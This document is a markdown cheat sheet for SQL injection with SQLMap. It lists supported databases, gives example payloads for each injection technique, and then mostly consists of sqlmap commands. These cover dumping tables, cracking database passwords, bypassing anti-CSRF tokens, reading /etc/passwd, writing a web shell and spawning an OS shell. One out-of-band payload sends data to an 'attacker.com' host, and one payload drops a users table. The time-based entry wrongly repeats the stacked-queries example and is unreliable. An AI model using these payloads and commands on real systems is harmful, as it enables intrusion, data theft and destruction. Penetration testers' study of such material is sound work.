# Supported DBMes

| 1                  | 2                    | 3                  | 4                      |
| ------------------ | -------------------- | ------------------ | ---------------------- |
| `MySQL`            | `Oracle`             | `PostgreSQL`       | `Microsoft SQL Server` |
| `SQLite`           | `IBM DB2`            | `Microsoft Access` | `Firebird`             |
| `Sybase`           | `SAP MaxDB`          | `Informix`         | `MariaDB`              |
| `HSQLDB`           | `CockroachDB`        | `TiDB`             | `MemSQL`               |
| `H2`               | `MonetDB`            | `Apache Derby`     | `Amazon Redshift`      |
| `Vertica`, `Mckoi` | `Presto`             | `Altibase`         | `MimerSQL`             |
| `CrateDB`          | `Greenplum`          | `Drizzle`          | `Apache Ignite`        |
| `Cubrid`           | `InterSystems Cache` | `IRIS`             | `eXtremeDB`            |
| `FrontBase`        |                      |                    |                        |

# Injection Techniques

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
Example of **Boolean-based blind SQL Injection**:
```sql
AND 1=1
```

- `E`: Error-based
Example of **Error-based SQL Injection**:
```sql
AND GTID_SUBSET(@@version,0)
```

- `U`: Union query-based
Example of **UNION query-based SQL Injection**:
```sql
UNION ALL SELECT 1,@@version,3
```

- `S`: Stacked queries
Example of **Stacked Queries**:
```sql
; DROP TABLE users
```

- `T`: Time-based blind
Example of **Stacked Queries**:
```sql
; DROP TABLE users
```

- `Q`: Inline queries
Example of **Inline Queries**:
```sql
SELECT (SELECT @@version) from
```

Example of **Out-of-band SQL Injection**:
```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

# Commands

Run SQLMap without asking for user input
```shell
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

SQLMap with POST request 
```shell
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

POST request specifying an injection point with an asterisk 
```shell
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

Passing an HTTP request file to SQLMap
```shell
sqlmap -r req.txt
```

Specifying a cookie header
```shell
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Specifying a PUT request
```shell
sqlmap -u www.target.com --data='id=1' --method PUT
```

Store traffic to an output file
```shell
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

Specify verbosity level 
```shell
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

Specifying a prefix or suffix
```shell
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -" 
```

Specifying the level and risk
```shell
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

Basic DB enumeration
```shell
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Table enumeration
```shell
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Table/row enumeration
```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

Conditional enumeration
```shell
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

Database schema enumeration
```shell
sqlmap -u "http://www.example.com/?id=1" --schema
```

Searching for data
```shell
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

Password enumeration and cracking
```shell
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

Anti-CSRF token bypass
```shell
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

List all tamper scripts
```shell
sqlmap --list-tampers
```

Check for DBA privileges
```shell
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

Reading a local file
```shell
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Writing a file
```shell
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Spawning an OS shell
```shell
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
